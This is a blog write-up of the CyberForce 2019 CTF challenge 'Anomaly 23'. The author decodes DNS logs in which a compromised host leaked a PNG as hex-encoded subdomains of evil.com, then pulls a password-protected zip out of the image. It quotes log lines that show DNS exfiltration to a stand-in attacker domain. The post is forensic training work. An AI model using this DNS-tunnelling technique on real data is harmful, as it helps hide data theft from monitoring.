<!DOCTYPE html>
<html lang="">

<head><meta name="generator" content="Hexo 3.8.0">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.ico">
    

    <title>
        
          Anomaly 23 - CMouse&#39;s Blog
        
    </title>

    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- Noto Sans TC -->
    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+TC" rel="stylesheet">
    <!-- Noto Sans SC -->
    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+SC" rel="stylesheet">
    <!-- Noto Sans -->
    <link href="https://fonts.googleapis.com/css?family=Noto+Sans" rel="stylesheet">

    <!-- theme css & js -->
    <link rel="stylesheet" href="/css/book.css">
    <script src="/js/book.js"></script>

    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('img')
})
</script>

</head>

<body>

<div class="container">
  <div class="book-container">
    <div class="columns">
      <div class="column col-2 hide-lg">
        <div class="book-sidebar">
  <h4 class="site-meta">
    <a href="/">CMouse&#39;s Blog</a>
  </h4>
  <div class="sidebar-content">
    <ul>
<li><a href="/">Home</a></li>
<li><a href="/picoctf/picoctf-2019">picoCTF 2019</a><ul>
<li><a href="/picoctf/whitepages">WhitePages</a></li>
<li><a href="/picoctf/c0rrupt">c0rrupt</a></li>
<li><a href="/picoctf/webnet0">WebNet0</a></li>
<li><a href="/picoctf/webnet1">WebNet1</a></li>
<li><a href="/picoctf/asm3">asm3</a></li>
<li><a href="/picoctf/asm4">asm4</a></li>
</ul>
</li>
<li><a href="/cyberforce/cyberforce-2019">CyberForce 2019</a><ul>
<li><a href="/cyberforce/cyberforce-2019-recap-cathy">Cathy’s Recap</a></li>
<li><a href="/cyberforce/anomaly-6">Anomaly 6</a></li>
<li><a href="/cyberforce/anomaly-23">Anomaly 23</a></li>
</ul>
</li>
<li><a href="/uncategorized/weird-cs-doodles">Weird CS Doodles</a></li>
</ul>

  </div>
</div>

<script src="/js/book-sidebar.js"></script>

<script>
collapse_sidebar(2)
highlight_tab()
show_sidebar()
</script>
      </div>

      <div class="column col-8 col-lg-12">
        <div class="book-content">
          <div class="book-navbar">
  <header class="navbar">
  <section class="navbar-section">
    <img class="navbar-icon" src="/favicon.ico">
  </section>
  <section class="navbar-center">
    CMouse&#39;s Blog
  </section>
  <section class="navbar-section">
    <label class="accordion-header c-hand" for="accordion-sidebar">
      <i class="icon icon-menu"></i>
    </label>
  </section>
</header>

<div class="accordion">
  <input type="checkbox" id="accordion-sidebar" name="accordion-checkbox" hidden>
  <div class="accordion-body">
    <ul>
<li><a href="/">Home</a></li>
<li><a href="/picoctf/picoctf-2019">picoCTF 2019</a><ul>
<li><a href="/picoctf/whitepages">WhitePages</a></li>
<li><a href="/picoctf/c0rrupt">c0rrupt</a></li>
<li><a href="/picoctf/webnet0">WebNet0</a></li>
<li><a href="/picoctf/webnet1">WebNet1</a></li>
<li><a href="/picoctf/asm3">asm3</a></li>
<li><a href="/picoctf/asm4">asm4</a></li>
</ul>
</li>
<li><a href="/cyberforce/cyberforce-2019">CyberForce 2019</a><ul>
<li><a href="/cyberforce/cyberforce-2019-recap-cathy">Cathy’s Recap</a></li>
<li><a href="/cyberforce/anomaly-6">Anomaly 6</a></li>
<li><a href="/cyberforce/anomaly-23">Anomaly 23</a></li>
</ul>
</li>
<li><a href="/uncategorized/weird-cs-doodles">Weird CS Doodles</a></li>
</ul>

  </div>
</div>
</div>

<div class="book-post">
  <h1 id="Anomaly-23-A-Picture-Paints-a-Thousand-Bytes"><a href="#Anomaly-23-A-Picture-Paints-a-Thousand-Bytes" class="headerlink" title="Anomaly 23: A Picture Paints a Thousand Bytes"></a>Anomaly 23: A Picture Paints a Thousand Bytes</h1><p>Points: 78</p>
<p>A host on the corporate IT network has been compromised and is using DNS to phone home. This activity has been noticed and the DNS logs have been dumped. Analyze the DNS logs (Anomaly 23.log) and identify what information has been transferred. Hint: <code>binwalk</code> is your friend.</p>
<hr>
<p>The provided file is a DNS log consisting of entries like these:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[2019-09-18 17:21:14.584856] Request: welt.de. -&gt; 12.144.168.8</span><br><span class="line">[2019-09-18 17:21:16.588879] Request: theguardian.com. -&gt; 19.125.142.118</span><br><span class="line">[2019-09-18 17:21:18.593032] Request: billboard.com. -&gt; 0.186.146.168</span><br><span class="line">[2019-09-18 17:21:22.599159] Request: maps.google.com. -&gt; 226.121.198.156</span><br><span class="line">[2019-09-18 17:21:26.604910] Request: ggpht.com. -&gt; 81.252.207.181</span><br><span class="line">[2019-09-18 17:21:30.610876] Request: ipv4.google.nl. -&gt; 33.182.243.182</span><br><span class="line">[2019-09-18 17:21:33.615910] Request: asus.com. -&gt; 236.91.244.113</span><br><span class="line">[2019-09-18 17:21:35.619530] Request: disney.go.com. -&gt; 14.194.152.155</span><br><span class="line">[2019-09-18 17:21:37.623749] Request: webdisk.hatena.ne.jp. -&gt; 26.56.120.179</span><br></pre></td></tr></table></figure>
<p>If we scroll down a bit, we notice something suspicious:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[2019-09-18 17:22:49.627109] Request: 89504e470d0a1a0a0000000d49484452000000780000007808030000000eba.evil.com. -&gt; 19.198.132.97</span><br></pre></td></tr></table></figure>
<p>We notice that: 1) all the characters in the subdomain are either digits or letters within the range ‘a’ to ‘f’, so it’s straightforward to think that they are bytes and 2) the bytes <code>89 50 4e 47 0d 0a 1a 0a</code> mark the beginning of a PNG file. It makes sense, because the challenge is titles as “a picture paints a thousand bytes”!</p>
<p>We can easily <code>grep</code> all the entries with the word “evil” and obtained a filtered version of the log file:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat Anomaly\ 23.log | grep evil &gt; anomaly_23.log.filtered</span></span><br></pre></td></tr></table></figure>
<p>We can then strip the image data from the log entries and recover our PNG file with a script like this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">data_list = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'anomaly_23.log.filtered'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    lines = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        tokens = line.split()</span><br><span class="line">        data = tokens[<span class="number">3</span>].split(<span class="string">'.'</span>)[<span class="number">0</span>]</span><br><span class="line">        data_list.append(bytes.fromhex(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'anomaly_23.png'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> data <span class="keyword">in</span> data_list:</span><br><span class="line">        f.write(data)</span><br></pre></td></tr></table></figure>
<p>We’ve recovered our PNG file!</p>
<p><img src="/images/cyberforce/anomaly_23.png" alt="anomaly\_23.png"></p>
<p>But wait… Doge doesn’t give us anything! How about running <code>binwalk</code> on the PNG file?</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             PNG image, 120 x 120, 8-bit colormap, non-interlaced</span><br><span class="line">5960          0x1748          Zip archive data, encrypted compressed size: 59, uncompressed size: 39, name: secret.txt</span><br><span class="line">6173          0x181D          End of Zip archive, footer length: 22</span><br></pre></td></tr></table></figure>
<p>Turns out there’s Zip archive data hidden in the PNG. We extract the PNG, but bad luck for us - it requires a password!</p>
<p>This was really a bad moment for me during the competition. I was so proud at myself for figuring out the PNG thing, and I couldn’t believe I was going to give up this challenge because of this. I tried brute-forcing the password to no avail, and then I realized the password might also be hidden in the log file.</p>
<p>I was right!</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat Anomaly\ 23.log | grep secret</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[2019-09-18 17:27:09.365396] Request: bGF3cmVuY2VsaXZlcm1vcmUK.password.secret.com. -&gt; 164.230.184.73</span><br></pre></td></tr></table></figure>
<p>Using the password “bGF3cmVuY2VsaXZlcm1vcmUK”, we were able to successfully extract the secret file, which contains the flag.</p>
<p><strong>References:</strong></p>
<p><a href="https://www.garykessler.net/library/file\_sigs.html" target="_blank" rel="noopener">https://www.garykessler.net/library/file\_sigs.html</a></p>

</div>


  <div class="book-comments">
    




  </div>


<script src="/js/book-post.js"></script>
        </div>
      </div>

      <div class="column col-2 hide-lg">
        <div class="book-toc">
  <div class="book-tocbot">
  </div>
  <div class="book-tocbot-menu">
    <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
    <a onclick="go_top()">Back to top</a>
    <a onclick="go_bottom()">Go to bottom</a>
  </div>
</div>

<script>
tocbot.init({
  tocSelector: '.book-tocbot',
  contentSelector: '.book-post',
  headingSelector: 'h1, h2, h3, h4, h5',
  collapseDepth: 2,
  orderedList: false,
  scrollSmooth: false,
});

function expand_toc(){
  var b = document.querySelector(".book-toc-expand");
  tocbot.init({
    tocSelector: '.book-tocbot',
    contentSelector: '.book-post',
    headingSelector: 'h1, h2, h3, h4, h5',
    collapseDepth: 6,
    orderedList: false,
    scrollSmooth: false,
  });
  b.setAttribute("onclick", "collapse_toc()");
  b.innerHTML = "Collapse all"
}

function collapse_toc(){
  var b = document.querySelector(".book-toc-expand");
  tocbot.init({
    tocSelector: '.book-tocbot',
    contentSelector: '.book-post',
    headingSelector: 'h1, h2, h3, h4, h5',
    collapseDepth: 2,
    orderedList: false,
    scrollSmooth: false,
  });
  b.setAttribute("onclick", "expand_toc()");
  b.innerHTML = "Expand all"
}

function go_top() {
  window.scrollTo(0, 0);
}

function go_bottom() {
  window.scrollTo(0, document.body.scrollHeight);
}

</script>
      </div>
    </div>
  </div>
</div>

</body>
</html>
